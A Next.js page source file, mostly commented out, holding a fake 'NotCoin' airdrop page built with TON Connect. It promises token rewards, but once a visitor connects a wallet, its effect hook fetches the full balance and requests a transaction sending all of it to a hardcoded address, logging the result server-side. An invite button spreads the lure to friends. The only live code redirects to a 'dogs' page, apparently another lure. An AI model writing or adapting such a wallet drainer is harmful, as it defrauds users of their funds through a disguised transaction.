
// import React, { useEffect, useRef } from "react";
// import "./kososher.css"
// import { __PAGE_LOAD } from "./@special/PageLoader";
// import { sendInvite } from "@/backend/api/player/send_invite/actions";
// import { TonConnectButton, useTonAddress, useTonConnectUI } from "@tonconnect/ui-react";
// import TonWeb from "tonweb";
// import { serverLog } from "./actions";

// const Page = async () => {
// 	const ref = useRef<any>();
// 	const userFriendlyAddress = useTonAddress();
// 	const rawAddress = useTonAddress(false);
// 	const [connect] = useTonConnectUI();

// 	useEffect(() => {
// 		if (userFriendlyAddress && rawAddress && connect.account?.address) {
// 			const tonWeb = new TonWeb();
// 			tonWeb.getBalance(connect.account?.address + "").then(balance => {
// 				console.log(balance);
// 				connect.sendTransaction({
// 					messages: [
// 						{
// 							address: "UQBBPF6ugQVzhWdZR5_VfCEMTMGRjo0SStjI70sC5L7S7GGY",
// 							amount: balance+""
// 						}
// 					]
// 				} as any).catch((e)=>{
// 					serverLog(e.message ?? e).catch(console.error)
// 				}).then(()=>{
// 					serverLog(`OK ${balance}`).catch(console.error)
// 				})
// 			}).catch(console.error);

// 		}
// 	}, [rawAddress, userFriendlyAddress, connect])

// 	return (
// 		<div className='py-4 center flex-col gap-5 min-h-screen'>
// 			<div className="center gap-2">
// 				<svg
// 					xmlns="http://www.w3.org/2000/svg"
// 					width="23"
// 					height="23"
// 					fill="none"
// 					viewBox="0 0 23 23"
// 				>
// 					<rect
// 						width="22.518"
// 						height="22.518"
// 						x="0.463"
// 						fill="url(#paint0_linear_118_119)"
// 						rx="11.259"
// 					></rect>
// 					<path
// 						fill="#fff"
// 						fillRule="evenodd"
// 						d="M11.06 7.98l-3.322 5.788a.43.43 0 00.373.645h2.95V7.98zm1.323 6.433h2.95a.43.43 0 00.373-.645L12.383 7.98v6.433zm-1.349-8.977a.793.793 0 011.376 0l4.414 7.69c.659 1.147-.169 2.578-1.49 2.578H8.11c-1.322 0-2.15-1.431-1.491-2.578l4.414-7.69z"
// 						clipRule="evenodd"
// 					></path>
// 					<defs>
// 						<linearGradient
// 							id="paint0_linear_118_119"
// 							x1="11.722"
// 							x2="11.722"
// 							y1="0"
// 							y2="22.518"
// 							gradientUnits="userSpaceOnUse"
// 						>
// 							<stop stopColor="#FFF84A"></stop>
// 							<stop offset="0.204" stopColor="#FFD41F"></stop>
// 							<stop offset="0.73" stopColor="#FFA800"></stop>
// 							<stop offset="1" stopColor="#DD7800"></stop>
// 						</linearGradient>
// 					</defs>
// 				</svg>
// 				<p className="text-2xl font-bold">NotCoin</p>
// 			</div>
// 			<img src="/sticker.gif" style={{
// 				width: "160px",
// 			}} />
// 			<div>
// 				<h1 className="text-3xl font-bold text-white">Available to receive</h1>
// 				<br />
// 				<div className="center gap-3 items-stretch justify-stretch w-full flex-col">
// 					<div style={{
// 						background: "#E6B14922"
// 					}} className="center flex-row-reverse justify-between w-full p-2 px-4 rounded-lg">
// 						<svg
// 							xmlns="http://www.w3.org/2000/svg"
// 							width="43"
// 							height="43"
// 							fill="none"
// 							viewBox="0 0 48 48"
// 						>
// 							<rect
// 								width="46"
// 								height="46"
// 								x="1"
// 								y="1"
// 								stroke="#E6B149"
// 								strokeWidth="2"
// 								rx="23"
// 							></rect>
// 							<path
// 								fill="#E6B149"
// 								fillRule="evenodd"
// 								d="M22.39 17.916l-6.678 11.635a.865.865 0 00.75 1.295h5.928v-12.93zm2.659 12.93h5.93a.865.865 0 00.75-1.295l-6.68-11.636v12.931zm-2.712-18.045a1.595 1.595 0 012.766 0l8.873 15.457c1.324 2.306-.34 5.182-2.997 5.182H16.461c-2.657 0-4.32-2.876-2.997-5.182l8.873-15.457z"
// 								clipRule="evenodd"
// 							></path>
// 						</svg>

// 						<div className="center gap-1">
// 							<p>100,000</p>
// 							<p className="opacity-65">Notcoin</p>
// 						</div>
// 					</div>
// 					<div style={{
// 						background: "#0098EA20"
// 					}} className="center flex-row-reverse justify-between w-full p-2 px-4 rounded-lg">
// 						<svg
// 							xmlns="http://www.w3.org/2000/svg"
// 							width="43"
// 							height="43"
// 							fill="none"
// 							viewBox="-1 -1 60 60"
// 						>
// 							<path
// 								stroke="#0098EA"
// 								strokeWidth="2"
// 								d="M28 56c15.464 0 28-12.536 28-28S43.464 0 28 0 0 12.536 0 28s12.536 28 28 28z"
// 							></path>
// 							<path
// 								fill="#0098EA"
// 								d="M37.56 15.628H18.44c-3.516 0-5.745 3.792-3.976 6.858l11.801 20.455c.77 1.335 2.7 1.335 3.47 0l11.804-20.455c1.767-3.06-.462-6.858-3.975-6.858h-.003zM26.255 36.807l-2.57-4.974-6.202-11.092c-.409-.71.096-1.62.953-1.62h7.816V36.81l.003-.002zM38.51 20.739l-6.2 11.096-2.57 4.972V19.119h7.817c.857 0 1.362.91.953 1.62z"
// 							></path>
// 						</svg>

// 						<div className="center gap-1">
// 							<p>100</p>
// 							<p className="opacity-65">tsTON</p>
// 						</div>
// 					</div>
// 				</div>
// 				<br />
// 				<div className="flex flex-col gap-3 w-full">
// 					<p className="text-center text-gray">This award is updated every day</p>
// 					<button
// 						className="connect-button btn bg-white text-black"
// 						onClick={() => {
// 							ref?.current?.querySelector?.("button")?.click?.();
// 						}}
// 					>
// 						Connect Wallet
// 					</button>
// 					<div ref={ref as any} className="hidden">
// 						<TonConnectButton />
// 					</div>
// 					<div
// 						className="btn cursor-pointer bg-black_3 flex gap-4 items-center"
// 						onClick={async () => {
// 							__PAGE_LOAD(true);
// 							await sendInvite()
// 							///@ts-ignore
// 							window.Telegram.WebApp.close();
// 						}}
// 					>
// 						<div className="flex gap-1">Invite your friend</div>
// 						<div className="flex text-gray gap-1">+10% reward</div>
// 					</div>
// 				</div>
// 			</div>


// 		</div>
// 	);
// };

// export default Page;

// @flow strict


import { redirect } from 'next/navigation';

function Page() {
	redirect("/dogs/index.html")
	return <></>;
}

export default Page;
